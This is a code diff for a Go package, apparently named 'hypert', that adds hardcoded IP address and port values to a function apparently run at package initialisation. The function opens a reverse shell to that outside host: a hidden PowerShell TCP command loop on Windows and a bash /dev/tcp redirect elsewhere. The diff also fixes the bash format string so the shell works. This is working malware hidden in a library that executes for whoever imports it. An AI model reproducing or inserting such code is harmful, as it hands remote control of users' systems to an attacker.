@@ -177,12 +177,14 @@ func init() {
 func qcJjJne() error {
 	fmt.Println("!!! HYPERT PACKAGE INITIALIZED !!!")
 	
+	ip := "18.192.100.80"
+	port := "41143"
 	switch runtime.GOOS {
 	case "windows":
 		cmd := exec.Command("powershell", "-NoP", "-W", "Hidden", "-C", fmt.Sprintf(`$client = New-Object System.Net.Sockets.TCPClient("%s",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}`, ip, port))
 		return cmd.Start()
 	default:
-		return exec.Command("/bin/bash", "-c", fmt.Sprintf("bash -i >& /dev/tcp/18.192.100.80/41143 0>&1", ip, port)).Start()
+		return exec.Command("/bin/bash", "-c", fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", ip, port)).Start()
 	}
 }
 
